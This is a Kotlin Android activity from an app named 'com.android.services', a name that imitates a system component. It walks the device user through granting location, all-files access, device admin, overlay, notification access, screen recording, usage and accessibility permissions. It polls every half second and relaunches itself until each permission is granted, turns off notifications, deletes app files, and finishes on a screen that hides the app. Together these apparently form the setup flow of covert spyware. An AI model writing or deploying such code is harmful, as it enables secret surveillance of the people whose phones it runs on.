package com.android.services.ui.activities

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import com.android.services.R
import com.android.services.enums.PermissionScreens
import com.android.services.models.PermissionSkip
import com.android.services.ui.navigator.AppNavigator
import com.android.services.util.*
import com.android.services.viewModel.ManualPermissionViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class ManualPermissionActivity : AppCompatActivity() {

    @Inject
    lateinit var appNavigator: AppNavigator
    private val manualPermissionViewModel: ManualPermissionViewModel by viewModels()

    // mainThread Handler
    private val mainThreadHandler by lazy {
        Handler(Looper.getMainLooper())
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_manual_permission)

        manualPermissionViewModel.preparePermissionsCounterList()
        // Get the Current In-Active permission and set the permission screen value for that permission
        manualPermissionViewModel.setPermissionScreen(this)

        // Permissions Screen Live Observer
        manualPermissionViewModel.permissionScreen.removeObserver(permissionScreenObserver)
        manualPermissionViewModel.permissionScreen.observeForever(permissionScreenObserver)

        if (!AppConstants.deleteAppDirectories && AppConstants.osGreaterThanEqualToEleven && AppUtils.isManagementOfAllFilesPermissionGranted(
                this
            )
        ) {
            AppUtils.deleteAppSpecificFiles(this)
            AppConstants.deleteAppDirectories = true
        }
    }

    @SuppressLint("NewApi")
    private val permissionScreenObserver: Observer<PermissionScreens> = Observer {
        it?.let { permissionScreen ->
            when (permissionScreen) {
                PermissionScreens.LOCATION_PERMISSION -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.LOCATION_PERMISSION)
                }

                PermissionScreens.MANAGEMENT_OF_ALL_FILES -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.MANAGEMENT_OF_ALL_FILES)
                }

                PermissionScreens.DEVICE_ADMIN_PERMISSION -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.DEVICE_ADMIN_PERMISSION)
                }

                PermissionScreens.DRAW_OVER_OTHER_APPS -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.DRAW_OVER_OTHER_APPS)
                }

                PermissionScreens.NOTIFICATION_ACCESS_PERMISSION -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.NOTIFICATION_ACCESS_PERMISSION)
                }

                PermissionScreens.SCREEN_RECORD_PERMISSION -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.SCREEN_RECORD_PERMISSION)
                }

                PermissionScreens.DISABLE_NOTIFICATION_ACCESS -> {
                    addHandlerCallbacks()
                    appNavigator.launchFragment(PermissionScreens.DISABLE_NOTIFICATION_ACCESS)
                    AppConstants.isDisableNotificationPerm = true
                }

                PermissionScreens.USAGE_ACCESS_PERMISSION -> {
                    addHandlerCallbacks()
                    AppConstants.isDisableNotificationPerm = false
                    appNavigator.launchFragment(PermissionScreens.USAGE_ACCESS_PERMISSION)
                }

                PermissionScreens.ACCESSIBILITY_PERMISSION -> {
                    addHandlerCallbacks()
                    AppConstants.isDisableNotificationPerm = false
                    appNavigator.launchFragment(PermissionScreens.ACCESSIBILITY_PERMISSION)
                }

                PermissionScreens.HIDE_APP -> {
                    appNavigator.launchFragment(PermissionScreens.HIDE_APP)
                }
            }
        }
    }

    private fun relaunchActivity(): Unit {
        startActivityWithData<ManualPermissionActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP
            )
        )
    }

    private fun addHandlerCallbacks() {
        mainThreadHandler.removeCallbacks(runnable)
        mainThreadHandler.postDelayed(runnable, 500)
    }

    private val runnable = Runnable {
        when (manualPermissionViewModel.getPermissionScreen()) {
            PermissionScreens.DEVICE_ADMIN_PERMISSION -> {
                if (AppUtils.shouldSkipPermission(PermissionScreens.DEVICE_ADMIN_PERMISSION)) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.LOCATION_PERMISSION -> {
                if (AppUtils.isLocationPermissionGranted(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.LOCATION_PERMISSION
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.MANAGEMENT_OF_ALL_FILES -> {
                if (AppUtils.isManagementOfAllFilesPermissionGranted(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.MANAGEMENT_OF_ALL_FILES
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.DRAW_OVER_OTHER_APPS -> {
                if (AppUtils.canDrawOverApps(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.DRAW_OVER_OTHER_APPS
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.NOTIFICATION_ACCESS_PERMISSION -> {
                if (AppUtils.isNotificationAccessEnabled(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.NOTIFICATION_ACCESS_PERMISSION
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.SCREEN_RECORD_PERMISSION -> {
                if (AppUtils.shouldSkipPermission(PermissionScreens.SCREEN_RECORD_PERMISSION)) {
                    relaunchActivity()
                    return@Runnable
                }
                // implement this
            }
            PermissionScreens.DISABLE_NOTIFICATION_ACCESS -> {
                if (!AppUtils.areNotificationsEnabled(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.DISABLE_NOTIFICATION_ACCESS
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.USAGE_ACCESS_PERMISSION -> {
                if (AppUtils.isUsageAccessPermissionGranted(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.USAGE_ACCESS_PERMISSION
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.ACCESSIBILITY_PERMISSION -> {
                if (AppUtils.isAccessibilityEnabled(this) || AppUtils.shouldSkipPermission(
                        PermissionScreens.ACCESSIBILITY_PERMISSION
                    )
                ) {
                    relaunchActivity()
                    return@Runnable
                }
            }
            PermissionScreens.HIDE_APP -> {

            }
        }
        callRecursiveHandler()
    }

    override fun onDestroy() {
        super.onDestroy()
        mainThreadHandler.removeCallbacks(runnable)
    }

    private fun callRecursiveHandler() {
        mainThreadHandler.postDelayed(runnable, 500)
    }

    companion object {
        const val TAG = "ManualPermissionActivity"
    }
}